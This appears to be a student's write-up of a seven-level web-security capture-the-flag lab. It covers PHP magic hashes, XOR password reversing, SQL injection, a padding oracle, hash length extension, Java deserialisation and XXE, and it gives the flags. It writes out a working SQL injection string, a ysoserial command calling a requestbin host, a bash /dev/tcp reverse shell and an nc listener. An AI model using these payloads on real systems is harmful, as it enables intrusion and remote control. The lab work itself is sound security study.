@@ -1,0 +1,36 @@
+level 1:
+The key was realising that php would interpet the hash starting with "0e" and consisting only of numerals as a float.
+I then wrote a python script iterating through numbers to attach to the prefix until the hash fit the regular expression "^0e[ 0-9]*$".
+I found "My lucky number is 161614089".
+flag{2fCeHg649Oa1baQA}
+
+level 2:
+Took some time to find the binary under /data.
+Decompiled with ghidra. Thought that if i were to try to hide a password in a binary i would XOR two strings, and the first interesting function that i decompiled seemed to do exactly that. Looked at usages of that function and found that the first usage XORed the input with a string and compared the result to another string. XORed those two strings and got "admin" interpreted in ASCII! Second use of the function was obviously checking the password: 0a677ebfe9eaccdcb878e9d219142b9d.
+flag{IO7eRAhsbe7YKyAl}
+
+level 3:
+Tried to inject all fields on the website. Sucessful on username. Tried to find out things about the user table. Found it had a password collumn. Iteratively guessed the password of tsutomu by with using the LEFT() function in the injected query. (inspired by how canaries are leaked). Probably can be done in a way more elegant way.
+Result: ' OR LEFT(password,31) ='kevinmitnickisanarrogantbastard' -- -
+Logged in as tsutomu and found the flag in his private blog.
+flag{ir1kvKKvuX9CmmlS}
+
+level 4:
+Vulnerable to Padding Orace attack. Found .hidden.txt by interepting the packet with burp suite. Got burp suite padding oracle hunter to work after lots of tries.
+flag{JIp6XtSmWvisOFqz}
+
+level 5:
+Recognised that it was a hash length extension attack fairly quickly. Wrote a python script using hashpump to extend the hashes. Then started looking around for which file to actually request. After a long time I intercepted a packet and saw .hidden.txt mentioned. Bingo. First did the extension attack wrong, until i realised i need to extend with "&filename=.hidden.txt" for it to work. Was only successful when I bruteforced password length. Password was 39 long and not 30 as mentioned on the website.
+flag{gMyWh8fcfhjhWw5K}
+
+level 6:
+Saw that this is the only service that gives you a cookie. Suspicious. Decoded the cookie assuming base64. Was able to decode some snippets including "javax.servlet.http.HttpServlet", and passwords + usernames. Realised i probably need to do a deserialisation attack after some time. Found ysoserial. Set up a server to listen to DNS requests and tested my attack. Payload:
+$ java -jar ysoserial-all.jar URLDNS  http://dnsdatacheck.2n3wkc6vfbr1r82h.b.requestbin.net | base64 -w 0 > DNSpayload.txt
+Next step: try all different ysoserial Payloads with a wget to a webhook-url+"/"+payload payload name, so i know which payloads actually worked. ("CommonsCollections5","CommonsCollections6","CommonsCollections7").
+Struggled to pop a reverse shell until i used ysoserial-modified.jar. reverse shell code: "bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1". Listening with: nc -lvnp port
+Looked around on the server: Lots of permissions denied! Figured out that i am wwwstudent_43, and that internally this level is called 06. (compare to path mentioned in social challenge). Luckily found: cat /var/websec/wwwstudent_43/level06/flag.txt Search was very frustrating and not rewarding. I wonder if there was a better way.
+tomcat{wmfmRzJpzLtiz7a1}
+
+level 7:
+Vulnerability: xxe. Upload an svg which incorporates the file mentioned in the admin bio. Used a standard svg payload from Payload All The Things. Padding was very frustrating. Wrote a python script to iterate through the lorem ipsum a few pixels at a time and looked through the output pictures. Found it.
+wsgi{FEKCCZcwYidfAurg}
